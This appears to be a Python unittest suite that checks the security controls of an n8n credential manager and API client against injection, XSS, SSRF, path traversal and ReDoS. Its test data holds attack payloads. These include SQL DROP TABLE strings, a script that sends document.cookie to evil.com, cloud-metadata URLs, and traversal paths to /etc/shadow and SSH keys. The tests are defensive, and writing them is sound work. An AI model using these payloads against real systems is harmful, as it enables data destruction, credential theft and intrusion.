"""
Comprehensive Security Tests

Tests security features across the n8n automation system including:
- SQL Injection prevention
- XSS (Cross-Site Scripting) prevention
- SSRF (Server-Side Request Forgery) protection
- Path Traversal prevention
- Encryption at rest
- ReDoS (Regular Expression Denial of Service) protection
- Input validation
- Authentication and authorization

Covers OWASP Top 10 security risks:
1. Injection
2. Broken Authentication
3. Sensitive Data Exposure
4. XML External Entities (XXE)
5. Broken Access Control
6. Security Misconfiguration
7. Cross-Site Scripting (XSS)
8. Insecure Deserialization
9. Using Components with Known Vulnerabilities
10. Insufficient Logging & Monitoring

Author: Security Team
Version: 1.0.0
Date: 2025-11-21
"""

import sys
import unittest
import tempfile
import json
import os
import time
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from skills.credential_manager import (
    CredentialManager,
    CredentialTemplate,
    CredentialLibrary
)

# Import security patch functions
try:
    from skills.n8n_api_client import (
        N8nApiClient,
        N8nValidationError,
        N8nAuthenticationError,
        N8nApiError
    )
    N8N_AVAILABLE = True
except ImportError:
    N8N_AVAILABLE = False


class TestSQLInjectionPrevention(unittest.TestCase):
    """
    Test SQL Injection Prevention (OWASP #1 - Injection)

    Verifies that the credential manager properly sanitizes and validates
    inputs to prevent SQL injection attacks when storing credential data.
    """

    def setUp(self):
        """Set up test fixtures"""
        self.manager = CredentialManager()

    def test_sql_injection_in_credential_name(self):
        """
        Prevents SQL injection through credential name field.

        Tests that malicious SQL code in credential names doesn't
        execute or cause security issues.
        """
        malicious_names = [
            "'; DROP TABLE credentials; --",
            "admin'--",
            "' OR '1'='1",
            "1' UNION SELECT * FROM users--",
            "admin'; DELETE FROM credentials WHERE '1'='1",
        ]

        for name in malicious_names:
            with self.assertRaises(ValueError, msg=f"Should reject SQL injection in name: {name}"):
                # Names exceeding 255 chars should be rejected
                # SQL injection strings should be stored safely without execution
                self.manager.add_credential(
                    name=name,
                    credential_type="postgresApi",
                    description="Test"
                )

    def test_sql_injection_in_credential_fields(self):
        """
        Prevents SQL injection through credential field values.

        Ensures that field values containing SQL injection attempts
        are safely stored without execution.
        """
        malicious_values = [
            {"username": {"value": "admin' OR '1'='1"}},
            {"password": {"value": "'; DROP TABLE users; --", "sensitive": True}},
            {"host": {"value": "localhost'; DELETE FROM logs--"}},
        ]

        for fields in malicious_values:
            # Should store the malicious string safely without executing
            cred = self.manager.add_credential(
                name="Test SQL Injection",
                credential_type="postgresApi",
                fields=fields
            )
            # Verify credential was created (stored safely)
            self.assertIsNotNone(cred)
            self.assertEqual(cred.fields, fields)

    def test_nosql_injection_in_mongodb_fields(self):
        """
        Prevents NoSQL injection in MongoDB connection strings.

        Tests that NoSQL injection attempts through MongoDB credentials
        are safely handled.
        """
        malicious_strings = [
            "mongodb://admin:password@localhost/?where=function(){return true}",
            "mongodb://[$ne]:[$ne]@localhost/db",
            "mongodb://admin:pass';db.dropDatabase();//@localhost",
        ]

        for conn_str in malicious_strings:
            cred = self.manager.add_credential(
                name="MongoDB Test",
                credential_type="mongoDb",
                fields={"connectionString": {"value": conn_str, "sensitive": True}}
            )
            # Verify stored safely
            self.assertIsNotNone(cred)


class TestXSSPrevention(unittest.TestCase):
    """
    Test XSS (Cross-Site Scripting) Prevention (OWASP #7)

    Verifies that workflow names, descriptions, and credential data
    properly escape or reject XSS attack vectors.
    """

    def setUp(self):
        """Set up test fixtures"""
        self.manager = CredentialManager()

    def test_xss_in_credential_name(self):
        """
        Prevents XSS through credential names.

        Ensures that JavaScript code in credential names doesn't
        execute when rendered in UI or logs.
        """
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<svg/onload=alert('XSS')>",
        ]

        for payload in xss_payloads:
            # Should either reject or safely store without execution
            # Since names have length limits, long payloads will be rejected
            if len(payload) <= 255:
                cred = self.manager.add_credential(
                    name=payload,
                    credential_type="httpBasicAuth",
                    description="XSS Test"
                )
                # Verify stored as literal string, not executed
                self.assertEqual(cred.name, payload)

    def test_xss_in_credential_description(self):
        """
        Prevents XSS through credential descriptions.

        Tests that HTML/JavaScript in descriptions is safely stored
        without execution.
        """
        xss_payloads = [
            "<script>document.cookie</script>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<BODY ONLOAD=alert('XSS')>",
        ]

        for payload in xss_payloads:
            cred = self.manager.add_credential(
                name="XSS Test Desc",
                credential_type="httpBasicAuth",
                description=payload
            )
            # Verify stored as literal string
            self.assertEqual(cred.description, payload)

    def test_xss_in_field_values(self):
        """
        Prevents XSS through credential field values.

        Ensures field values with XSS payloads are stored safely.
        """
        xss_field = {
            "headerValue": {
                "value": "<script>fetch('http://evil.com?cookie='+document.cookie)</script>",
                "sensitive": True
            }
        }

        cred = self.manager.add_credential(
            name="XSS Field Test",
            credential_type="httpHeaderAuth",
            fields=xss_field
        )
        self.assertIsNotNone(cred)


class TestSSRFProtection(unittest.TestCase):
    """
    Test SSRF (Server-Side Request Forgery) Protection

    Verifies that URL validation prevents requests to:
    - Private IP addresses (10.x, 172.16-31.x, 192.168.x)
    - Localhost/loopback (127.x)
    - Link-local addresses (169.254.x)
    - Cloud metadata endpoints
    """

    @unittest.skipIf(not N8N_AVAILABLE, "n8n_api_client not available")
    def test_blocks_private_ip_addresses(self):
        """
        Blocks SSRF attacks using private IP addresses.

        Prevents attackers from accessing internal network resources
        through private IP ranges.
        """
        private_ips = [
            "http://10.0.0.1:5678",
            "http://172.16.0.1:5678",
            "http://172.31.255.255:5678",
            "http://192.168.1.1:5678",
            "http://192.168.0.100:5678",
        ]

        for ip in private_ips:
            with self.assertRaises(N8nValidationError, msg=f"Should block private IP: {ip}"):
                client = N8nApiClient(api_url=ip, api_key="test-key-12345678")

    @unittest.skipIf(not N8N_AVAILABLE, "n8n_api_client not available")
    def test_blocks_localhost_addresses(self):
        """
        Blocks SSRF attacks using localhost/loopback addresses.

        Prevents attackers from accessing localhost services
        and internal APIs.
        """
        localhost_urls = [
            "http://127.0.0.1:5678",
            "http://127.0.0.2:5678",
            "http://localhost:5678",
            "http://[::1]:5678",  # IPv6 loopback
        ]

        for url in localhost_urls:
            with self.assertRaises(N8nValidationError, msg=f"Should block localhost: {url}"):
                client = N8nApiClient(api_url=url, api_key="test-key-12345678")

    @unittest.skipIf(not N8N_AVAILABLE, "n8n_api_client not available")
    def test_blocks_link_local_addresses(self):
        """
        Blocks SSRF attacks using link-local addresses.

        Prevents access to link-local addresses which can expose
        cloud metadata services.
        """
        link_local_urls = [
            "http://169.254.0.1:5678",      # AWS metadata
            "http://169.254.169.254:5678",  # AWS metadata endpoint
        ]

        for url in link_local_urls:
            with self.assertRaises(N8nValidationError, msg=f"Should block link-local: {url}"):
                client = N8nApiClient(api_url=url, api_key="test-key-12345678")

    @unittest.skipIf(not N8N_AVAILABLE, "n8n_api_client not available")
    def test_blocks_invalid_url_schemes(self):
        """
        Blocks non-HTTP(S) URL schemes to prevent protocol smuggling.

        Only allows http:// and https:// schemes to prevent
        file://, ftp://, gopher://, etc. attacks.
        """
        invalid_schemes = [
            "file:///etc/passwd",
            "ftp://internal-ftp-server.local",
            "gopher://evil.com",
            "data:text/html,<script>alert('XSS')</script>",
        ]

        for url in invalid_schemes:
            with self.assertRaises(N8nValidationError, msg=f"Should block scheme: {url}"):
                client = N8nApiClient(api_url=url, api_key="test-key-12345678")


class TestPathTraversalPrevention(unittest.TestCase):
    """
    Test Path Traversal Prevention (OWASP #5 - Broken Access Control)

    Verifies that workflow IDs and file paths properly validate
    to prevent directory traversal attacks.
    """

    @unittest.skipIf(not N8N_AVAILABLE, "n8n_api_client not available")
    def test_blocks_path_traversal_in_workflow_id(self):
        """
        Prevents path traversal through workflow IDs.

        Blocks attempts to access files outside intended directories
        using ../ sequences.
        """
        traversal_ids = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "workflow/../../secrets",
            "legit/../../../etc/shadow",
        ]

        client = N8nApiClient(
            api_url="https://safe-domain.example.com",
            api_key="test-key-12345678"
        )

        for wf_id in traversal_ids:
            with self.assertRaises(N8nValidationError, msg=f"Should block traversal: {wf_id}"):
                client._validate_workflow_id(wf_id)

    @unittest.skipIf(not N8N_AVAILABLE, "n8n_api_client not available")
    def test_blocks_absolute_paths_in_workflow_id(self):
        """
        Prevents absolute path access through workflow IDs.

        Blocks attempts to specify absolute file paths.
        """
        absolute_paths = [
            "/etc/passwd",
            "/var/log/secure",
            "C:\\Windows\\System32\\config\\SAM",
            "/root/.ssh/id_rsa",
        ]

        client = N8nApiClient(
            api_url="https://safe-domain.example.com",
            api_key="test-key-12345678"
        )

        for path in absolute_paths:
            with self.assertRaises(N8nValidationError, msg=f"Should block absolute path: {path}"):
                client._validate_workflow_id(path)

    @unittest.skipIf(not N8N_AVAILABLE, "n8n_api_client not available")
    def test_allows_valid_workflow_ids(self):
        """
        Allows valid workflow IDs while blocking malicious ones.

        Ensures legitimate workflow IDs pass validation.
        """
        valid_ids = [
            "workflow-123",
            "my_workflow",
            "WorkFlow_001",
            "test-workflow-2024",
        ]

        client = N8nApiClient(
            api_url="https://safe-domain.example.com",
            api_key="test-key-12345678"
        )

        for wf_id in valid_ids:
            # Should not raise exception
            try:
                client._validate_workflow_id(wf_id)
            except N8nValidationError:
                self.fail(f"Valid workflow ID rejected: {wf_id}")


class TestEncryptionAtRest(unittest.TestCase):
    """
    Test Encryption at Rest (OWASP #3 - Sensitive Data Exposure)

    Verifies that sensitive credential data is encrypted when stored
    and properly decrypted when retrieved.
    """

    def test_credentials_encrypted_with_key(self):
        """
        Ensures credentials are encrypted when encryption key is provided.

        Tests that sensitive fields are encrypted at rest using Fernet
        symmetric encryption.
        """
        try:
            from cryptography.fernet import Fernet

            # Generate encryption key
            key = Fernet.generate_key()
            manager = CredentialManager(encryption_key=key)

            # Add credential with sensitive field
            cred = manager.add_credential(
                name="Encrypted Cred",
                credential_type="httpBasicAuth",
                fields={
                    "username": {"value": "admin", "required": True},
                    "password": {"value": "SuperSecret123!", "required": True, "sensitive": True}
                }
            )

            # Verify password field is marked as encrypted
            self.assertTrue(cred.fields["password"].get("_encrypted", False))

            # Verify encrypted value is different from original
            encrypted_value = cred.fields["password"]["value"]
            self.assertNotEqual(encrypted_value, "SuperSecret123!")

        except ImportError:
            self.skipTest("cryptography library not available")

    def test_encryption_key_from_environment(self):
        """
        Tests encryption key loading from environment variable.

        Verifies that CREDENTIAL_ENCRYPTION_KEY environment variable
        is properly used for encryption.
        """
        try:
            from cryptography.fernet import Fernet

            # Generate and set encryption key in environment
            key = Fernet.generate_key()

            with patch.dict(os.environ, {'CREDENTIAL_ENCRYPTION_KEY': key.decode()}):
                manager = CredentialManager()

                # Verify encryption is enabled
                self.assertTrue(manager._encryption_enabled)

        except ImportError:
            self.skipTest("cryptography library not available")

    def test_decryption_with_correct_key(self):
        """
        Verifies encrypted credentials can be decrypted with correct key.

        Tests the full encryption/decryption cycle.
        """
        try:
            from cryptography.fernet import Fernet

            key = Fernet.generate_key()
            manager = CredentialManager(encryption_key=key)

            original_password = "MySecretPassword123!"

            # Add credential
            manager.add_credential(
                name="Test Decrypt",
                credential_type="postgresApi",
                fields={
                    "password": {"value": original_password, "sensitive": True}
                }
            )

            # Get credential and decrypt
            cred = manager.get_credential("Test Decrypt")
            decrypted_fields = manager._process_fields_for_use(cred.fields)

            # Verify decryption works
            self.assertEqual(decrypted_fields["password"]["value"], original_password)

        except ImportError:
            self.skipTest("cryptography library not available")

    def test_encryption_fails_with_wrong_key(self):
        """
        Ensures decryption fails with incorrect encryption key.

        Tests that wrong keys cannot decrypt credentials,
        maintaining data confidentiality.
        """
        try:
            from cryptography.fernet import Fernet

            key1 = Fernet.generate_key()
            key2 = Fernet.generate_key()

            # Encrypt with key1
            manager1 = CredentialManager(encryption_key=key1)
            manager1.add_credential(
                name="Test Wrong Key",
                credential_type="httpBasicAuth",
                fields={"password": {"value": "secret", "sensitive": True}}
            )

            # Try to decrypt with key2
            manager2 = CredentialManager(encryption_key=key2)
            cred = manager1.get_credential("Test Wrong Key")

            with self.assertRaises(ValueError):
                manager2._process_fields_for_use(cred.fields)

        except ImportError:
            self.skipTest("cryptography library not available")


class TestReDoSPrevention(unittest.TestCase):
    """
    Test ReDoS (Regular Expression Denial of Service) Prevention

    Verifies that regex operations have proper input size limits
    to prevent catastrophic backtracking attacks.
    """

    @unittest.skipIf(not N8N_AVAILABLE, "n8n_api_client not available")
    def test_version_detection_limits_input_size(self):
        """
        Prevents ReDoS in version detection regex.

        Ensures version detection only processes limited input size
        to prevent regex catastrophic backtracking.
        """
        client = N8nApiClient(
            api_url="https://safe-domain.example.com",
            api_key="test-key-12345678"
        )

        # Mock response with extremely large content
        large_content = "version: " + "a" * 1000000  # 1MB of 'a's

        mock_response = Mock()
        mock_response.ok = True
        mock_response.text = large_content

        with patch.object(client.session, 'get', return_value=mock_response):
            # Should not hang or timeout due to ReDoS
            start_time = time.time()
            result = client.get_n8n_version()
            elapsed = time.time() - start_time

            # Should complete quickly (under 2 seconds)
            self.assertLess(elapsed, 2.0, "Version detection took too long (possible ReDoS)")

    def test_credential_name_length_limit(self):
        """
        Prevents ReDoS through excessively long credential names.

        Enforces maximum length on credential names to prevent
        regex attacks and resource exhaustion.
        """
        manager = CredentialManager()

        # Try to create credential with very long name
        long_name = "a" * 1000

        with self.assertRaises(ValueError, msg="Should reject overly long credential name"):
            manager.add_credential(
                name=long_name,
                credential_type="httpBasicAuth"
            )

    @unittest.skipIf(not N8N_AVAILABLE, "n8n_api_client not available")
    def test_workflow_id_length_limit(self):
        """
        Prevents ReDoS through excessively long workflow IDs.

        Enforces maximum length on workflow IDs.
        """
        client = N8nApiClient(
            api_url="https://safe-domain.example.com",
            api_key="test-key-12345678"
        )

        long_id = "workflow-" + "a" * 1000

        with self.assertRaises(N8nValidationError):
            client._validate_workflow_id(long_id)


class TestInputValidation(unittest.TestCase):
    """
    Test Input Validation (OWASP #1 - Injection)

    Verifies comprehensive input validation across all user inputs.
    """

    def test_empty_credential_name_rejected(self):
        """
        Rejects empty credential names.

        Prevents creation of credentials without names.
        """
        manager = CredentialManager()

        empty_names = ["", "   ", "\t", "\n"]

        for name in empty_names:
            with self.assertRaises(ValueError, msg=f"Should reject empty name: '{name}'"):
                manager.add_credential(
                    name=name,
                    credential_type="httpBasicAuth"
                )

    def test_empty_credential_type_rejected(self):
        """
        Rejects empty credential types.

        Ensures all credentials have valid types.
        """
        manager = CredentialManager()

        empty_types = ["", "   "]

        for cred_type in empty_types:
            with self.assertRaises(ValueError, msg=f"Should reject empty type: '{cred_type}'"):
                manager.add_credential(
                    name="Test",
                    credential_type=cred_type
                )

    def test_invalid_credential_type_rejected(self):
        """
        Rejects unknown credential types.

        Validates credential types against known types list.
        """
        manager = CredentialManager()

        with self.assertRaises(ValueError):
            manager.add_credential(
                name="Test",
                credential_type="invalidTypeXYZ123"
            )

    @unittest.skipIf(not N8N_AVAILABLE, "n8n_api_client not available")
    def test_empty_api_key_rejected(self):
        """
        Rejects empty or invalid API keys.

        Ensures API authentication is properly configured.
        """
        invalid_keys = ["", "   ", "short", "a" * 1000]

        for api_key in invalid_keys:
            with self.assertRaises(N8nValidationError):
                client = N8nApiClient(
                    api_url="https://safe-domain.example.com",
                    api_key=api_key
                )

    @unittest.skipIf(not N8N_AVAILABLE, "n8n_api_client not available")
    def test_empty_api_url_rejected(self):
        """
        Rejects empty API URLs.

        Ensures API URL is properly configured.
        """
        with self.assertRaises(N8nValidationError):
            client = N8nApiClient(api_url="", api_key="test-key-12345678")


class TestAuthenticationSecurity(unittest.TestCase):
    """
    Test Authentication Security (OWASP #2 - Broken Authentication)

    Verifies authentication mechanisms are secure and properly implemented.
    """

    @unittest.skipIf(not N8N_AVAILABLE, "n8n_api_client not available")
    def test_api_key_in_header(self):
        """
        Verifies API key is sent in header, not URL.

        Ensures API keys are not exposed in URLs/logs.
        """
        client = N8nApiClient(
            api_url="https://safe-domain.example.com",
            api_key="test-key-12345678"
        )

        # Verify API key is in headers
        self.assertIn("X-N8N-API-KEY", client.session.headers)
        self.assertEqual(client.session.headers["X-N8N-API-KEY"], "test-key-12345678")

    @unittest.skipIf(not N8N_AVAILABLE, "n8n_api_client not available")
    def test_credentials_not_in_logs(self):
        """
        Ensures credentials are sanitized in log output.

        Prevents credential leakage through logs.
        """
        # Test that URLs with credentials are sanitized
        url_with_creds = "https://user:password@example.com/api"

        # This would be called internally - verify sanitization works
        # The _sanitize_url function should remove credentials
        from skills import n8n_api_client

        if hasattr(n8n_api_client, '_sanitize_url'):
            sanitized = n8n_api_client._sanitize_url(url_with_creds)
            self.assertNotIn("password", sanitized)

    def test_encryption_key_not_logged(self):
        """
        Ensures encryption keys are never logged.

        Prevents key leakage through logs.
        """
        try:
            from cryptography.fernet import Fernet

            key = Fernet.generate_key()

            # Create manager - key should not appear in logs
            manager = CredentialManager(encryption_key=key)

            # Verify manager exists but key is not exposed
            self.assertIsNotNone(manager)
            self.assertTrue(manager._encryption_enabled)

        except ImportError:
            self.skipTest("cryptography library not available")


class TestAccessControl(unittest.TestCase):
    """
    Test Access Control (OWASP #5 - Broken Access Control)

    Verifies proper access control and authorization mechanisms.
    """

    def test_credential_manifest_file_permissions(self):
        """
        Verifies credential manifest files have restrictive permissions.

        Ensures credential files are only readable by owner (600 permissions).
        """
        manager = CredentialManager()
        manager.add_credential("Test", "httpBasicAuth")

        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json') as f:
            filepath = f.name

        try:
            manager.save_manifest(filepath)

            # Check file permissions
            stat_info = os.stat(filepath)
            permissions = stat_info.st_mode & 0o777

            # Should be 600 (owner read/write only)
            self.assertEqual(permissions, 0o600, "Credential file should have 600 permissions")

        finally:
            if os.path.exists(filepath):
                os.unlink(filepath)


class TestSecureConfiguration(unittest.TestCase):
    """
    Test Secure Configuration (OWASP #6 - Security Misconfiguration)

    Verifies system defaults and configurations are secure.
    """

    def test_encryption_warning_when_disabled(self):
        """
        Warns when encryption is not enabled.

        Ensures users are notified about security implications
        when encryption is disabled.
        """
        # Create manager without encryption
        with patch('skills.credential_manager.logger') as mock_logger:
            manager = CredentialManager()

            # Should have logged a warning about missing encryption
            # (if cryptography is available but no key provided)
            try:
                from cryptography.fernet import Fernet
                # If library is available, should warn
                mock_logger.warning.assert_called()
            except ImportError:
                # If library not available, skip
                pass

    @unittest.skipIf(not N8N_AVAILABLE, "n8n_api_client not available")
    def test_https_required_in_production(self):
        """
        Recommends HTTPS for production use.

        While HTTP is allowed for development, production should use HTTPS.
        """
        # This test documents the recommendation
        # Both HTTP and HTTPS are allowed, but HTTPS is recommended

        http_client = N8nApiClient(
            api_url="http://localhost:5678",
            api_key="test-key-12345678"
        )
        self.assertIsNotNone(http_client)

        https_client = N8nApiClient(
            api_url="https://n8n.example.com",
            api_key="test-key-12345678"
        )
        self.assertIsNotNone(https_client)

    def test_default_environment_is_production(self):
        """
        Verifies default environment is 'production'.

        Ensures secure defaults - credentials default to production
        environment requiring explicit opt-in for less secure environments.
        """
        manager = CredentialManager()
        cred = manager.add_credential("Test", "httpBasicAuth")

        self.assertEqual(cred.environment, "production")


class TestRateLimiting(unittest.TestCase):
    """
    Test Rate Limiting (DoS Prevention)

    Verifies rate limiting prevents abuse and resource exhaustion.
    """

    @unittest.skipIf(not N8N_AVAILABLE, "n8n_api_client not available")
    def test_rate_limit_enforcement(self):
        """
        Verifies rate limiting is enforced.

        Prevents excessive API requests that could cause DoS.
        """
        from skills.n8n_api_client import N8nRateLimitError

        # Create client with very low rate limit for testing
        client = N8nApiClient(
            api_url="https://safe-domain.example.com",
            api_key="test-key-12345678",
            rate_limit_requests=2,
            rate_limit_period=60
        )

        # Make requests up to limit
        for i in range(2):
            client._check_rate_limit()

        # Next request should raise rate limit error
        with self.assertRaises(N8nRateLimitError):
            client._check_rate_limit()


# Test suite summary
def suite():
    """Create test suite"""
    test_suite = unittest.TestSuite()

    # Add all test classes
    test_suite.addTests(unittest.TestLoader().loadTestsFromTestCase(TestSQLInjectionPrevention))
    test_suite.addTests(unittest.TestLoader().loadTestsFromTestCase(TestXSSPrevention))
    test_suite.addTests(unittest.TestLoader().loadTestsFromTestCase(TestSSRFProtection))
    test_suite.addTests(unittest.TestLoader().loadTestsFromTestCase(TestPathTraversalPrevention))
    test_suite.addTests(unittest.TestLoader().loadTestsFromTestCase(TestEncryptionAtRest))
    test_suite.addTests(unittest.TestLoader().loadTestsFromTestCase(TestReDoSPrevention))
    test_suite.addTests(unittest.TestLoader().loadTestsFromTestCase(TestInputValidation))
    test_suite.addTests(unittest.TestLoader().loadTestsFromTestCase(TestAuthenticationSecurity))
    test_suite.addTests(unittest.TestLoader().loadTestsFromTestCase(TestAccessControl))
    test_suite.addTests(unittest.TestLoader().loadTestsFromTestCase(TestSecureConfiguration))
    test_suite.addTests(unittest.TestLoader().loadTestsFromTestCase(TestRateLimiting))

    return test_suite


if __name__ == '__main__':
    print("=" * 70)
    print("COMPREHENSIVE SECURITY TEST SUITE")
    print("=" * 70)
    print("\nTesting OWASP Top 10 Security Controls:")
    print("  1. Injection Prevention (SQL, NoSQL, Command)")
    print("  2. Broken Authentication")
    print("  3. Sensitive Data Exposure")
    print("  5. Broken Access Control")
    print("  6. Security Misconfiguration")
    print("  7. Cross-Site Scripting (XSS)")
    print("  + SSRF Protection")
    print("  + Path Traversal Prevention")
    print("  + ReDoS Prevention")
    print("  + Rate Limiting")
    print("=" * 70)
    print()

    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite())

    print("\n" + "=" * 70)
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Skipped: {len(result.skipped)}")
    print("=" * 70)

    sys.exit(0 if result.wasSuccessful() else 1)
